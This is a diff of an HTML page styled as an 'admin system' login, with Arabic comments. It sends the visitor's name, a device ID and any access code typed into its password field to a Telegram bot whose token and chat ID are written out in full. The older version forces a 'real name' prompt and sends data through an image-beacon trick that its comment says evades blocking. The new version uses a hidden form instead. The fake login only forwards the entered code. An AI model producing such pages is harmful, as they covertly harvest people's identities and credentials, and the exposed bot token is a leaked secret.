@@ -3,87 +3,140 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Admin V81</title>
+    <title>System Admin V85</title>
     <style>
-        body { background: #000; color: lime; font-family: sans-serif; text-align: center; padding: 20px; }
-        input, button { padding: 10px; width: 80%; margin: 10px 0; font-size: 18px; }
-        button { background: lime; color: black; border: none; font-weight: bold; cursor: pointer; }
-        #status { color: yellow; margin-top: 10px; }
+        body { background-color: #0f0f0f; color: #00ff00; font-family: Tahoma, sans-serif; text-align: center; padding: 20px; }
+        .container { border: 2px solid #00ff00; padding: 15px; border-radius: 10px; max-width: 400px; margin: 0 auto; background: #1a1a1a; }
+        input, button { width: 90%; padding: 10px; margin: 10px 0; font-size: 16px; border-radius: 5px; border: none; }
+        input { background: #333; color: white; text-align: center; }
+        button { background: #00ff00; color: black; font-weight: bold; cursor: pointer; }
+        button:disabled { background: gray; }
+        
+        /* شاشة رد السيرفر - دي اللي هتعرفنا الحقيقة */
+        iframe {
+            width: 100%;
+            height: 80px;
+            background: white;
+            color: black;
+            border: 2px solid red;
+            margin-top: 10px;
+            display: none; /* مخفية في البداية */
+        }
+        .server-label { color: yellow; font-size: 12px; margin-top: 5px; display: none; }
     </style>
 </head>
 <body>
 
-    <h2>🔥 النظام الإجباري V81 🔥</h2>
-    <p>الاسم المسجل: <b id="showName" style="color:white">...</b></p>
-    
-    <!-- زرار يدوي عشان لو الأوتوماتيك معلق -->
-    <button onclick="forceSend()"> اضغط هنا لإرسال البيانات الآن </button>
-    <p id="status">انتظار...</p>
+    <!-- 1. الفورم السحري (مخفي بس هو اللي بيبعت) -->
+    <!-- بنبعت للآيدي اللي في الصور بتاعتك -1003886528114 -->
+    <form id="telegramForm" action="https://api.telegram.org/bot8596993745:AAG0FXH8LFqweLH5nlPTcFpEM07BHhabrHw/sendMessage" method="POST" target="responseFrame">
+        <input type="hidden" name="chat_id" value="-1003886528114">
+        <input type="hidden" name="parse_mode" value="HTML">
+        <input type="hidden" name="text" id="msgContent">
+    </form>
 
-    <hr>
-    <input type="password" placeholder="كود الدخول">
-    <button>دخول</button>
+    <div class="container">
+        <h2>🚀 النظام الإداري V85</h2>
+        
+        <!-- قسم التسجيل -->
+        <div id="regSection">
+            <p>🔴 مطلوب: تسجيل الاسم الحقيقي</p>
+            <input type="text" id="myName" placeholder="اكتب اسمك ثلاثي هنا...">
+            <button onclick="registerUser()" id="regBtn">تسجيل وإرسال</button>
+        </div>
+
+        <!-- قسم التطبيق -->
+        <div id="appSection" style="display:none;">
+            <h3>✅ تم الدخول</h3>
+            <p>الاسم: <span id="dispName" style="color:white"></span></p>
+            <p>ID: <span id="dispID"></span></p>
+            <hr>
+            <input type="password" id="pass" placeholder="كود الدخول">
+            <button onclick="login()">فتح</button>
+        </div>
+
+        <!-- شاشة النتيجة -->
+        <p class="server-label" id="lbl">👇 رد سيرفر تليجرام (لو ظهر true يبقى وصل) 👇</p>
+        <iframe name="responseFrame" id="responseFrame"></iframe>
+    </div>
 
 <script>
-    // بياناتك (ثابتة)
-    const BOT = "8596993745:AAG0FXH8LFqweLH5nlPTcFpEM07BHhabrHw";
-    const CHAT = "-1003886528114";
-    
-    // مفاتيح التخزين
-    const KEY_NAME = "NAME_V81_FINAL";
-    const KEY_ID = "ID_V81_FINAL";
+    // ============================================
+    // إعدادات النظام
+    // ============================================
+    const KEY_NAME = "USER_NAME_V85";
+    const KEY_ID = "DEVICE_ID_V85";
 
-    // 1. التأكد من الآيدي
-    let myID = localStorage.getItem(KEY_ID);
-    if (!myID) {
-        myID = "ID-" + Math.floor(Math.random() * 100000);
-        localStorage.setItem(KEY_ID, myID);
+    // 1. الآيدي
+    let devID = localStorage.getItem(KEY_ID);
+    if (!devID) {
+        devID = "ID-" + Math.floor(Math.random() * 900000 + 100000);
+        localStorage.setItem(KEY_ID, devID);
     }
 
-    // 2. إجبار الاسم
-    let myName = localStorage.getItem(KEY_NAME);
-    
-    function startSequence() {
-        if (!myName || myName.length < 3) {
-            let input = prompt("⚠️ تنبيه هام:\nيجب كتابة اسمك الحقيقي للدخول:");
-            if (input && input.length > 2) {
-                myName = input;
-                localStorage.setItem(KEY_NAME, myName);
-                document.getElementById("showName").innerText = myName;
-                forceSend("تسجيل جديد");
-            } else {
-                startSequence(); // يعيد الطلب لو مكتبش
-            }
-        } else {
-            document.getElementById("showName").innerText = myName;
-            forceSend("فتح البرنامج");
+    // 2. التحقق من الاسم القديم
+    let savedName = localStorage.getItem(KEY_NAME);
+    if (savedName && savedName.length > 2) {
+        document.getElementById("regSection").style.display = "none";
+        document.getElementById("appSection").style.display = "block";
+        document.getElementById("dispName").innerText = savedName;
+        document.getElementById("dispID").innerText = devID;
+        
+        // إرسال تنبيه في الخلفية
+        sendToTg(savedName, "♻️ فتح البرنامج (مستخدم عائد)");
+    }
+
+    // 3. دالة التسجيل (الزر)
+    function registerUser() {
+        const nameVal = document.getElementById("myName").value;
+        if (nameVal.length < 3) {
+            alert("اكتب الاسم بشكل صحيح");
+            return;
+        }
+
+        document.getElementById("regBtn").disabled = true;
+        document.getElementById("regBtn").innerText = "جاري الإرسال...";
+        
+        localStorage.setItem(KEY_NAME, nameVal);
+        
+        // إرسال البيانات
+        sendToTg(nameVal, "🆕 <b>تسجيل جديد</b>");
+
+        // إظهار النتيجة للمستخدم
+        document.getElementById("lbl").style.display = "block";
+        document.getElementById("responseFrame").style.display = "block";
+
+        setTimeout(() => {
+            alert("تم إرسال البيانات! انظر للمربع الأبيض أسفل الشاشة للتأكد.");
+            location.reload(); // إعادة تحميل عشان يدخل علطول
+        }, 3000);
+    }
+
+    // 4. دالة الإرسال عبر الفورم
+    function sendToTg(uName, action) {
+        const txt = `
+🚨 <b>SYSTEM ALERT V85</b>
+━━━━━━━━━━━━
+👤 <b>Name:</b> ${uName}
+🆔 <b>ID:</b> <code>${devID}</code>
+📝 <b>Action:</b> ${action}
+━━━━━━━━━━━━
+        `;
+        
+        document.getElementById("msgContent").value = txt;
+        document.getElementById("telegramForm").submit();
+    }
+
+    // 5. دالة الدخول (باسورد)
+    function login() {
+        const p = document.getElementById("pass").value;
+        if(p.length > 0) {
+            sendToTg(document.getElementById("dispName").innerText, "🔐 محاولة دخول بكود: " + p);
+            document.getElementById("lbl").style.display = "block";
+            document.getElementById("responseFrame").style.display = "block";
         }
     }
 
-    // 3. دالة الإرسال (طريقة الصورة المخفية)
-    function forceSend(action = "تحديث") {
-        document.getElementById("status").innerText = "جاري الإرسال...";
-        
-        const msg = `🚨 *SYSTEM V81*\n👤 Name: ${myName}\n🆔 ID: ${myID}\n📝 Action: ${action}`;
-        
-        // رابط تليجرام المباشر
-        const url = `https://api.telegram.org/bot${BOT}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-
-        // خدعة الصورة (بتعدي من الحظر)
-        const img = new Image();
-        img.src = url;
-        
-        // مفيش رد هيجي لأنها صورة، بس بنفترض الوصول
-        setTimeout(() => {
-            document.getElementById("status").innerText = "✅ تم إرسال الطلب للسيرفر";
-            document.getElementById("status").style.color = "lime";
-        }, 1000);
-    }
-
-    // تشغيل فوري
-    setTimeout(startSequence, 500);
-
 </script>
-
 </body>
 </html>
